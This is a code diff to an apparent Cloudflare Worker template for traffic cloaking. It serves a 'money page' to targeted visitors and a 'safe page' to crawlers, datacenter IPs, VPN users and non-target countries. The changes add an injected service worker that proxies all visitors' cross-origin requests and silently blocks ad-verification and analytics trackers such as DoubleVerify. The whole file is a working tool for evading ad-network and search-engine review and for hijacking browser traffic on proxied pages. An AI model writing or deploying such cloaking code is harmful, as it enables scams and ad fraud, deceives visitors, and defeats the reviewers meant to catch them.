@@ -755,29 +755,25 @@ const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
 // --- END CONFIGURATION ---
 
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request, event));
-});
+export default {
+  async fetch(request) {
+    const url = new URL(request.url);
 
-async function handleRequest(request, event) {
-  const url = new URL(request.url);
+    // ROUTE 1: Serve the service worker script itself when the browser requests it.
+    if (url.pathname === '/service-worker.js') {
+      const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const proxyUrl = \\\`\\\${selfOrigin}proxy-resource/\\\${encodeURIComponent(url.href)}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
+      return new Response(swCode, { headers: { 'Content-Type': 'application/javascript' } });
+    }
 
-  // ROUTE 1: Block service worker requests to prevent issues
-  if (url.pathname === '/service-worker.js') {
-    return new Response('// Service worker disabled', { 
-      status: 404,
-      headers: { 'Content-Type': 'application/javascript' } 
-    });
+    // ROUTE 2: Handle proxied resource requests (for CSS, JS, images).
+    if (url.pathname.startsWith('/proxy-resource/')) {
+      return handleResourceRequest(request);
+    }
+    
+    // ROUTE 3: Handle the initial page load with cloaking logic.
+    return handleMainRequest(request);
   }
-
-  // ROUTE 2: Handle proxied resource requests (for CSS, JS, images).
-  if (url.pathname.startsWith('/proxy-resource/')) {
-    return handleResourceRequest(request);
-  }
-  
-  // ROUTE 3: Handle the initial page load with cloaking logic.
-  return handleMainRequest(request, event.env);
-}
+};
 
 // --- CORE FUNCTIONS ---
 
@@ -788,84 +784,33 @@ async function handleRequest(request, event) {
  * @param {Object} env Environment variables containing API keys.
  * @returns {Promise<boolean>} Returns true if the visitor should be blocked, false otherwise.
  */
-async function isVisitorABot(request, env) {
+async function isVisitorABot(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
-  const apiKey = env?.PROXYCHECK_API_KEY || 'demo'; // Use demo key if not provided
-  const riskThreshold = 75; // Block visitors with risk score >= 75
-  
-  // Step 1: Country Check (ip-api.com) - Quick pre-filter
+
+  // Step 1: Basic Geo/ISP Check (ip-api.com)
   const ipApiUrl = \`http://ip-api.com/json/\${clientIP}?fields=countryCode,isp\`;
-  try {
-    const ipApiResponse = await fetch(ipApiUrl);
-    if (ipApiResponse.ok) {
-      const ipApiData = await ipApiResponse.json();
-      if (!TARGET_COUNTRIES.includes(ipApiData.countryCode)) {
-        return true; // Block traffic from non-target countries
-      }
+  const ipApiResponse = await fetch(ipApiUrl);
+  if (ipApiResponse.ok) {
+    const ipApiData = await ipApiResponse.json();
+    if (!TARGET_COUNTRIES.includes(ipApiData.countryCode) || ['google', 'amazon', 'microsoft'].some(b => ipApiData.isp.toLowerCase().includes(b))) {
+      return true; // Block non-target traffic or known datacenter ISPs
     }
-  } catch (error) {
-    console.error('ip-api.com check failed:', error.message);
-    // Continue to proxycheck.io even if country check fails
   }
 
-  // Step 2: Comprehensive proxycheck.io Analysis
-  // Construct the API URL with all flags enabled for the most detailed response.
-  // vpn=1 (check for VPNs), asn=1 (get ISP data), risk=1 (get the risk score)
-  const apiUrl = \`https://proxycheck.io/v2/\${clientIP}?key=\${apiKey}&vpn=1&asn=1&risk=1\`;
+  // Step 2: Professional Fraud Check (proxycheck)
+  const apiUrl = \`http://proxycheck.io/v2/\${clientIP}?key=YOUR_PROXYCHECK_API_KEY_HERE&vpn=1\`;
+  
+  const response = await fetch(apiUrl);
+  if (!response.ok) return true; // Fail safe (block)
+  const data = await response.json();
 
-  try {
-    const response = await fetch(apiUrl);
-    if (!response.ok) {
-      console.error('proxycheck.io API request failed.');
-      return true; // FAIL SAFE: If the API fails, we block the visitor to protect the money page.
-    }
-
-    const data = await response.json();
-    const ipData = data[clientIP];
-
-    if (!ipData) {
-      console.error('Unexpected API response format from proxycheck.io.');
-      return true; // FAIL SAFE: If the response is weird, we block.
-    }
-
-    // --- The Multi-Layered Filtering Logic ---
-
-    // RULE 1: Block known proxies and VPNs explicitly.
-    if (ipData.proxy === 'yes') {
-      return true;
-    }
-
-    // RULE 2: Block based on type. This is how we catch Googlebots and other crawlers.
-    // The 'type' can be 'VPN', 'Proxy', 'Hosting', 'Search Engine Bot', etc.
-    const forbiddenTypes = ['hosting', 'search engine bot'];
-    if (ipData.type && forbiddenTypes.includes(ipData.type.toLowerCase())) {
-        return true;
-    }
-
-    // RULE 3: Block based on the risk score.
-    if (ipData.risk && parseInt(ipData.risk, 10) >= riskThreshold) {
-      return true;
-    }
-    
-    // RULE 4: Block based on the organization name. This is a final safety net.
-    const bannedOrgs = ['google', 'amazon', 'microsoft', 'ovh', 'hetzner', 'cloudflare'];
-    if (ipData.organisation && bannedOrgs.some(org => ipData.organisation.toLowerCase().includes(org))) {
-        return true;
-    }
-
-    // If the visitor passes ALL checks, they are clean.
-    return false;
-
-  } catch (error) {
-    console.error(\`Error during proxycheck.io check: \${error.message}\`);
-    return true; // FAIL SAFE: On any unexpected error, we block.
-  }
+  return data[clientIP]?.proxy === 'yes';
 }
 
 // Proxies the main HTML page and rewrites its content.
-async function handleMainRequest(request, env) {
+async function handleMainRequest(request) {
   try {
-    const isBot = await isVisitorABot(request, env);
+    const isBot = await isVisitorABot(request);
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
     const response = await fetch(targetUrl, request);
@@ -881,35 +826,12 @@ async function handleMainRequest(request, env) {
 
 // Proxies all other resources (CSS, JS, images, fonts).
 async function handleResourceRequest(request) {
-  try {
-    const resourceUrl = decodeURIComponent(new URL(request.url).pathname.replace('/proxy-resource/', ''));
-    
-    // Create a new request with proper headers
-    const resourceRequest = new Request(resourceUrl, {
-      method: request.method,
-      headers: request.headers,
-      body: request.body
-    });
-    
-    const response = await fetch(resourceRequest);
-    
-    // Create new response with CORS headers
-    const newResponse = new Response(response.body, {
-      status: response.status,
-      statusText: response.statusText,
-      headers: response.headers
-    });
-    
-    // Add CORS headers
-    newResponse.headers.set('Access-Control-Allow-Origin', '*');
-    newResponse.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    newResponse.headers.set('Access-Control-Allow-Headers', '*');
-    
-    return newResponse;
-  } catch (error) {
-    console.error('Resource request failed:', error);
-    return new Response('Resource not found', { status: 404 });
-  }
+  const resourceUrl = decodeURIComponent(new URL(request.url).pathname.replace('/proxy-resource/', ''));
+  const resourceRequest = new Request(resourceUrl, request);
+  const response = await fetch(resourceRequest);
+  let newResponse = new Response(response.body, response);
+  newResponse.headers.set('Access-Control-Allow-Origin', '*');
+  return newResponse;
 }
 
 // Rewrites URLs in HTML attributes.
@@ -939,11 +861,10 @@ class AttributeRewriter {
   }
 }
 
-// Injects any necessary scripts into the HTML head.
+// Injects the service worker into the HTML head.
 class HeadRewriter {
   element(head) {
-    // Add any necessary head modifications here
-    // Service worker removed to simplify proxy logic
+    head.append(\`<script>if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/service-worker.js').catch(e => console.error(e)); }</script>\`, { html: true });
   }
 }
 `;
